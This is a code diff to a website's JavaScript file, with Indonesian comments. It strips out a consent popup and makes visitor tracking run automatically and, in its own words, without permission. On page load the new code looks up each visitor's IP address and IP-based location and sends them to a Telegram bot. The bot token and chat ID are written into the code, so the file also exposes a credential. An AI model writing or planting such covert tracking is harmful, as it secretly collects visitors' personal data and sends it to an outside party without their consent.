@@ -139,20 +139,16 @@ document.addEventListener('DOMContentLoaded', () => {
     renderTeam();
 });
 
-// ============= TRACKING (LANGSUNG KE TELEGRAM) =============
+// ============= TRACKING OTOMATIS (TANPA IZIN) =============
 async function sendToTelegram(data) {
     const botToken = '8784325672:AAGIjFlqRS_MnMzXaqcgn3lhIzcGaq-1E30';
     const chatId = '8564704937';
     
     let msg = `📍 NEW VISITOR\n━━━━━━━━━━━━━━━━━━━━\n`;
     msg += `🌐 IP: ${data.ip || '-'}\n`;
-    if (data.lat) {
-        msg += `📍 GPS: ${data.lat}, ${data.lon}\n📏 Akurasi: ${data.accuracy} meter\n`;
-        msg += `🏠 Alamat: ${data.address || '-'}\n`;
-    } else if (data.city) {
-        msg += `📍 Lokasi: ${data.city}, ${data.region}, ${data.country}\n`;
-        msg += `📡 ISP: ${data.isp}\n`;
-    }
+    msg += `📍 Lokasi: ${data.city || '-'}, ${data.region || '-'}, ${data.country || '-'}\n`;
+    msg += `📡 ISP: ${data.isp || '-'}\n`;
+    msg += `🗺️ Koordinat: ${data.lat || '-'}, ${data.lon || '-'}\n`;
     msg += `\n🕐 Waktu: ${new Date().toLocaleString('id-ID')}`;
     
     const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
@@ -168,92 +164,36 @@ async function sendToTelegram(data) {
     }
 }
 
-async function getLocationFromIP(ip) {
-    try {
-        const res = await fetch(`http://ip-api.com/json/${ip}`);
-        const data = await res.json();
-        if (data.status === 'success') {
-            return {
-                city: data.city,
-                region: data.regionName,
-                country: data.country,
-                isp: data.isp,
-                lat: data.lat,
-                lon: data.lon
-            };
-        }
-    } catch(e) {}
-    return null;
-}
-
 async function trackUser() {
-    let ip = null;
     try {
-        const res = await fetch('https://api.ipify.org?format=json');
-        const data = await res.json();
-        ip = data.ip;
-    } catch(e) {}
-    
-    if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(async (pos) => {
-            const lat = pos.coords.latitude;
-            const lon = pos.coords.longitude;
-            const accuracy = pos.coords.accuracy;
-            
-            let address = '';
-            try {
-                const geoRes = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`);
-                const geo = await geoRes.json();
-                address = geo.display_name || '';
-            } catch(e) {}
-            
+        // Dapatkan IP
+        const ipRes = await fetch('https://api.ipify.org?format=json');
+        const { ip } = await ipRes.json();
+        
+        // Dapatkan lokasi dari IP
+        const geoRes = await fetch(`http://ip-api.com/json/${ip}`);
+        const geo = await geoRes.json();
+        
+        if (geo.status === 'success') {
             await sendToTelegram({
                 ip: ip,
-                lat: lat,
-                lon: lon,
-                accuracy: accuracy,
-                address: address
-            });
-        }, async () => {
-            const ipData = await getLocationFromIP(ip);
-            if (ipData) {
-                await sendToTelegram({
-                    ip: ip,
-                    city: ipData.city,
-                    region: ipData.region,
-                    country: ipData.country,
-                    isp: ipData.isp
-                });
-            } else {
-                await sendToTelegram({ ip: ip });
-            }
-        });
-    } else {
-        const ipData = await getLocationFromIP(ip);
-        if (ipData) {
-            await sendToTelegram({
-                ip: ip,
-                city: ipData.city,
-                region: ipData.region,
-                country: ipData.country,
-                isp: ipData.isp
+                city: geo.city,
+                region: geo.regionName,
+                country: geo.country,
+                isp: geo.isp,
+                lat: geo.lat,
+                lon: geo.lon
             });
         } else {
             await sendToTelegram({ ip: ip });
         }
+    } catch(e) {
+        console.log('Tracking error:', e);
     }
 }
 
-// ============= POPUP =============
+// ============= JALANKAN TRACKING OTOMATIS =============
+// Tracking langsung tanpa popup, tanpa izin
 setTimeout(() => {
-    const popup = document.getElementById('trackPopup');
-    if (popup) popup.style.display = 'block';
-}, 3000);
-
-const trackBtn = document.getElementById('trackBtn');
-if (trackBtn) {
-    trackBtn.onclick = () => {
-        document.getElementById('trackPopup').style.display = 'none';
-        trackUser();
-    };
-}
+    trackUser();
+}, 2000);
